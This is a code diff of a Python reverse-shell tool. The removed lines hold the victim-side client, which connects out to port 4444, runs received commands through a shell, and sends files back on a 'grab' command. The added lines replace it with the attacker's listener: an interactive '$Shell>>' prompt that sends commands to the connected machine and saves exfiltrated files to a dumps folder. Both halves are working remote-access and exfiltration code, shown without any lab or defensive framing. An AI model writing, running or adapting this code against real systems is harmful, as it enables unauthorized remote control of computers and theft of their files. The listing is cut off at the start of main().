@@ -1,43 +1,50 @@
-import socket
-import subprocess, os
+import socket,os
 
 
-
-IP = '127.0.0.1'
+IP = '192.168.25.225'
 PORT = 4444
 
-def transfer(s, path):
-    if os.path.exists(path):
-        f = open(path,'rb')
-        packet = f.read(1024)
-        while len(packet) > 0:
-            s.send(packet)
-            packet = f.read(1024)
-        s.send('DONE'.encode())
-        f.close()
-    else:
-        s.send('NOT FOUND'.encode())
+
+def transfer(conn, command):
+    path_save = os.getcwd()
+    conn.send(command.encode())
+    grab, path = command.split("*")
+    f = open(path_save+"/dumps/"+path, 'wb')
+    while True:
+        bits = conn.recv(1024)
+        if bits.endswith('DONE'.encode('utf8', errors='ignore')):
+            f.write(bits[:-4]) # Write those last received bits without the word 'DONE' 
+            f.close()
+            print ('[+] Transfer completed ')
+            break
+        if 'File not found'.encode('utf8', errors='ignore') in bits:
+            print ('[-] Unable to find out the file')
+            break
+        f.write(bits)
 
 def connect():
     s = socket.socket()
-    s.connect((IP,PORT))
+    s.bind((IP,PORT))
+    s.listen(1)
+    conn, addr = s.accept()
+    print(f"GOT: {conn}:{addr}")
     while True:
-        command = s.recv(1024)
-        if 'terminate' in command.decode():
-            s.close()
-            break # break while
-        elif 'grab' in command.decode():
-            grab, path = command.decode().split("*")
-            try:
-                transfer(s, path)
-            except:
-                pass
+        command = input("$Shell>> ")
 
-        else:
-            c = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            # stardart output
-            s.send(c.stdout.read())
-            s.send(c.stderr.read())
+        if command == "":
+            command = "id"
+            conn.send(command.encode('utf8', errors='ignore'))
+            print(f"Data GOT: {conn.recv(1024).decode()}")
+
+        if 'terminate' in command:
+            conn.send('terminate'.encode('utf8', errors='ignore'))
+            conn.close()
+            break #exit while
+        elif 'grab' in command:
+            transfer(conn, command)
+        else: 
+            conn.send(command.encode('utf8', errors='ignore'))
+            print(f"Data GOT: {conn.recv(1024).decode('ISO-8859-1')}")
 
 
 def main():
